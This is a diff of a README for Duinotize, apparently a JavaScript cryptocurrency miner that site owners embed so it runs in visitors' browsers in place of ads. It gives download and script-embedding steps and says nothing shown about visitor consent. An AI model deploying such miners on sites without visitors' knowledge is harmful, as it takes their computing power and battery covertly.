@@ -6,7 +6,7 @@ Tired of showing users ads? Use Duinotize! It's a modified version of the Duino-
 ## Installation
 Download [miner.js](https://github.com/mobilegmYT/Duinotize/raw/main/miner.js) + [hashes.js](https://github.com/mobilegmYT/Duinotize/raw/main/hashes.js), and put them in a new folder named `worker` in your website's root folder. For a example of how this is setup, look at https://github.com/Amog-OS/website, and you can also visit https://www.amogos.studio/ and open the dev console to see the code in action.
 
-Put the following code at the very bottom of the HTML page where you want the miner to start: (most likley your home page, as the miner will run in the background for the duration your visiters are on the site, not just the page)
+Put the following code at the very bottom of the HTML page where you want the miner to start:
 ```
 <script>
 let threads = "1";
@@ -26,4 +26,4 @@ This project is a fork/continuation of https://github.com/VatsaDev/Mineuino as t
 
 ## Notes
 - If there is enough demand for it, I might be able to add a XXHASH miner to the code
-- I made this in 2 hours, so if there are bugs PLEASE report them
+- I made this in just 2 hours at 1AM, so if there are bugs PLEASE report them
